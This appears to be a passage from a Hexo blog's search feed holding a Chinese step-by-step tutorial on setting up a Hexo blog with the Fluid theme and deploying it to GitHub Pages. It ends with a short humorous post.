    <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer"><h3 id="mwsvX">1. 安装Git和NodeJS</h3>在Windows上使用Git，可以从Git官网直接 [链接](https://nodejs.org/en/download/)，然后按默认选项安装即可。安装完成后，在开始菜单里找到“Git”->“Git Bash”，蹦出一个类似命令行窗口的东西，就说明Git安装成功！<p><font style="color:rgb(77, 77, 77);">在Git中绑定</font><a href="https://so.csdn.net/so/search?q=Github&spm=1001.2101.3001.7020">Github</a><font style="color:rgb(77, 77, 77);">账号，打开“Git Bash”，在命令框中依次输入两行命令：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730122176480-947a8af1-1f8f-40a6-843d-7245a1af0951.png"></p><p><font style="color:rgb(77, 77, 77);">由于 Hexo 是基于 </font><font style="color:rgb(78, 161, 219) !important;">Node.js</font><font style="color:rgb(77, 77, 77);"> 驱动的一款博客框架，所以安装NodeJS</font></p><p><font style="color:rgb(77, 77, 77);">安装链接 </font><a href="https://nodejs.org/en/download/"><strong><font style="color:rgb(77, 77, 77);">链接</font></strong></a><font style="color:rgb(77, 77, 77);">  </font></p><p><font style="color:rgb(77, 77, 77);">安装之后可以输入以下命令查看是否安装成功</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730122594305-bc902a94-dc86-4732-91b6-799a315eadc4.png"></p><h3 id="saDpL">2、创建仓库</h3><font style="color:rgb(77, 77, 77);">在Github上创建一个新的代码仓库用于保存我们的网页。</font><p><font style="color:rgb(77, 77, 77);">点击your repositories，进入仓库页面。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730190147327-0bc66877-0d78-48cc-a740-d2bb7d18f13b.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730190183954-4e313937-7c9f-4044-901f-f1d55928a3c8.png"></p><p><font style="color:rgb(77, 77, 77);">填写仓库名，格式必须为&lt;用户名&gt;.github.io，然后点击Create repository。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730190254911-a63f9c5c-ac26-45aa-a3dd-13c21bb3a736.png"></p><p><font style="color:rgb(77, 77, 77);">新文件的名字必须为index.html，内容先随便写一个简单的，内容示例如下，填写之后点击commit new file 提交。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;en&quot;&gt;<br>&lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br>    &lt;title&gt;yaorongke&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1&gt;big_freeze_mouse的个人主页&lt;/h1&gt;<br>    &lt;h1&gt;Hello ~&lt;/h1&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730190377399-e825e496-7828-4522-be0a-6e5c342964c2.png"></p><p><font style="color:rgb(77, 77, 77);">GitHub Pages中找到我的主页的地址为 <a href="https://icemouse094.github.io/">https://icemouse094.github.io/</a></font></p><h3 id="UIOS5"><font style="color:rgb(79, 79, 79);">3、安装Hexo</font></h3><font style="color:rgb(77, 77, 77);">准备好了就可使用 npm 开始安装 Hexo 了，在命令行输入执行如下命令：</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">npm install -g hexo-cli<br></code></pre></td></tr></table></figure><p>如果出现报错如图所示</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730186452554-fc2aa372-a5d2-4089-ab06-5329de5cb522.png"></p><p>可能是网络问题导致，可删除代理 输入下行代码可删除代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">npm config delete proxy<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730186646972-c3351174-cb1b-4a33-89f3-fadefef14a35.png"></p><p>输入代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo -v<br></code></pre></td></tr></table></figure><p>查看是否安装成功</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730186367731-f4a0a6b7-5ecd-4da0-bc33-50ca0662d2cb.png"></p><p>安装好后输入代码创建一个hexo-blog</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo init hexo-blog<br>cd hexo-blog<br>npm install<br></code></pre></td></tr></table></figure><p>本地启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo g<br>hexo server<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730191968474-2a543708-b7b4-4b20-acfd-80e46da93df0.png"></p><p><font style="color:rgb(77, 77, 77);">浏览器访问 <a href="http://localhost:4000，页面默认主图风格如下">http://localhost:4000，页面默认主图风格如下</a></font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730191839764-fc8805cf-56ce-4ad2-9a2f-1f5444664a91.png"></p><h3 id="lgDcL">4、更换主题</h3><h5 id="a40a0e93"><font style="color:rgb(79, 79, 79);">Fluid主题</font></h5><font style="color:rgb(77, 77, 77);">下载</font>[<font style="color:rgb(77, 77, 77);">链接</font>](https://github.com/fluid-dev/hexo-theme-fluid/releases)<font style="color:rgb(77, 77, 77);">解压到 themes目录，并将解压出的文件夹重命名为 fluid。</font><p><strong><font style="color:rgb(77, 77, 77);">指定主题</font></strong></p><p><font style="color:rgb(77, 77, 77);">如下修改 hexo 博客目录中的 _config.ymi：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">theme: fluid  # 指定主题<br>language: zh-CN  # 指定语言，会影响主题显示的语言，按需修改<br></code></pre></td></tr></table></figure><p><strong><font style="color:rgb(77, 77, 77);">创建「关于页」</font></strong></p><p><font style="color:rgb(77, 77, 77);">首次使用主题的「关于页」需要手动创建：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo new page about<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">创建成功后，编辑博客目录下 &#x2F;source&#x2F;about&#x2F;index.md,添加 layout属性。</font></p><p><font style="color:rgb(77, 77, 77);">修改后的文件示例如下：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">---<br>title: about<br>date: 2020-02-23 19:20:33<br>layout: about<br>---<br><br>这里写关于页的正文，支持 Markdown, HTML<br></code></pre></td></tr></table></figure><p>本地启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo g -d<br>hexo s<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">浏览器访问 <a href="http://localhost:4000，fluid主题风格页面如下">http://localhost:4000，fluid主题风格页面如下</a></font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730252562919-b1ef5656-7d08-4b79-ac8d-ed0055b148dd.png"></p><h3 id="u3CvN">5、创建文章</h3><font style="color:rgb(77, 77, 77);">如下修改 Hexo 博客目录中的 _config.yml，打开这个配置是为了在生成文章的时候生成一个同名的资源目录用于存放图片文件</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">post_asset_folder: true<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">执行如下命令创建一篇新文章，名为《测试文章》</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo new post 巨龙是个蛋<br></code></pre></td></tr></table></figure><p> <img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730274152080-2ec9b341-276a-4213-bf48-b249aedbb0e9.png"></p><p>打开’巨龙是个蛋.md’编辑</p><p> <img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730274287787-326f7cfc-5843-43d9-bef7-b9155e33a99e.png"></p><p>并且找到D:\IT tools\hexo-blog\themes\fluid\source\img目录下放入图片</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730274361536-17ad2953-da4d-44f1-a31a-2dd12ae732e9.png"></p><p><font style="color:rgb(79, 79, 79);">  </font><strong><font style="color:rgb(77, 77, 77);">本地启动</font></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo g -d<br>hexo s<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">浏览器访问 <a href="http://localhost:4000，页面如下，文章添加成功">http://localhost:4000，页面如下，文章添加成功</a></font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730274499814-3af90422-80f2-480a-9682-e6fcf3e4e47a.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730274509461-33188dfe-2e62-4548-a688-db26f4820dc9.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730274476134-842e822f-5646-4d33-9479-614a8b7406a9.png"></p><h3 id="H2pdC"><font style="color:rgb(79, 79, 79);">六、个性化页面展示</font></h3><font style="color:rgb(77, 77, 77);">页面的标题等位置显示默认的文字，可以改下显示一些个性化的信息。</font><h5 id="7c67931a"><font style="color:rgb(79, 79, 79);">1. 浏览器tab页名称</font></h5><font style="color:rgb(77, 77, 77);">修改根目录下 _config.yml中的 title 字段。</font>   ![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1730253575896-91c51c43-ad97-4ad9-b044-b8dfa7d2e890.png)<h5 id="94886889"><font style="color:rgb(79, 79, 79);">2. 博客标题</font></h5><font style="color:rgb(77, 77, 77);">主题目录 themes/fluid 下 _config.yml 中的 blog_title 字段。</font><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730253745291-dbeefeb7-57a9-492e-9037-b6d3d7d9bb39.png"></p><h5 id="67ba6a3b"><font style="color:rgb(79, 79, 79);">3. 主页正中间的文字</font></h5><font style="color:rgb(77, 77, 77);">主题目录 themes/fluid 下 _config.yml 中的 text 字段。</font><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730253892818-596b6105-ad0b-41d6-90c3-e85a2a1ad461.png"></p><p><font style="color:rgb(77, 77, 77);">修改好配置后，页面效果如下，可以看到现在显示的内容变成了我们的个人信息</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730253934649-89676fdf-1478-42a9-aae6-dae242b1e946.png"></p><h4 id="XZPIo">4、<font style="color:rgb(44, 62, 80);">页面顶部大图</font></h4><font style="color:rgb(44, 62, 80);">主题配置中，每个页面都有名为 banner.img的属性，可以使用本地图片的相对路径，也可以为外站链接，比如：</font><p><font style="color:rgb(44, 62, 80);">指向本地图片：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">banner_img: /img/bg/example.jpg   # 对应存放在 /source/img/bg/example.jpg<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730273651176-d9072fe0-311f-450d-b755-7c4664dae123.png"></p><p>再修改对应的_config.yml即可</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730273697692-e7818c0c-3a03-464e-baf1-74a6347deab4.png"></p><p>效果如下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730273727036-04c4a869-c70f-40dc-a24a-3d6139fbe587.png"></p><h4 id="o3HIQ">5、关于页</h4><font style="color:rgb(44, 62, 80);">首次使用主题的「关于页」需要手动创建：</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">$ hexo new page about<br></code></pre></td></tr></table></figure><p><font style="color:rgb(44, 62, 80);">创建成功后修改 </font><font style="color:rgb(77, 77, 77);">&#x2F;source&#x2F;about&#x2F;index.md</font><font style="color:rgb(44, 62, 80);">，添加 layout 属性。</font></p><p><font style="color:rgb(44, 62, 80);">修改后的文件示例如下：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730275038306-b1090d24-468b-4b72-8f34-7a0945250d29.png"></p><p><font style="color:rgb(44, 62, 80);">在关于页介绍自己的基础信息，可以在</font><strong><font style="color:rgb(44, 62, 80);">主题配置</font></strong><font style="color:rgb(44, 62, 80);">中设置：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730275400803-d4732a65-0603-4bb1-978f-e0cd5f13d6c0.png"></p><p>效果如下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730275441214-c3f8b9d6-0030-4084-a2fd-84b330351a92.png"></p><h3 id="ojT4M"><font style="color:rgb(79, 79, 79);">七、发布到GitHub Pages</font></h3><font style="color:rgb(77, 77, 77);">安装hexo-deployer-git</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">修改根目录下的 _config.yml，配置 Github 相关信息</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">deploy:<br>  type: git<br>  repo: https://github.com/icemouse094/icemouse094.github.io.git<br>  branch: main<br>  token:<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">其中 token 为 Github 的 personal access tokens获取方式如下图</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730286061607-ca21af95-7ecd-4c4f-bae6-b0a3af843d0d.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730388930492-982843a8-b4b4-423d-ab9a-124b29f51aeb.png"></p><p><font style="color:rgb(77, 77, 77);">部署到GitHub</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo g -d<br></code></pre></td></tr></table></figure><p>浏览器访问<font style="color:rgb(77, 77, 77);"><a href="https://icemouse094.github.io/">https://icemouse094.github.io/</a> 部署成功</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730286705380-26555cef-089c-451b-a153-25ff2e14c202.png"></p>]]></content>
    
    
    <categories>
      
      <category>The  construction of website</category>
      
    </categories>
    
    
    <tags>
      
      <tag>搭建过程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>巨龙是个蛋</title>
    <link href="/2024/10/30/%E5%B7%A8%E9%BE%99%E6%98%AF%E4%B8%AA%E8%9B%8B/"/>
    <url>/2024/10/30/%E5%B7%A8%E9%BE%99%E6%98%AF%E4%B8%AA%E8%9B%8B/</url>
    
    <content type="html"><![CDATA[<p>如果我在一个公司待的不爽 可以离职吗</p><p><img src="/images/cub.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Abstract literature</category>
      
      <category>zoopartry</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Abstract literature</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
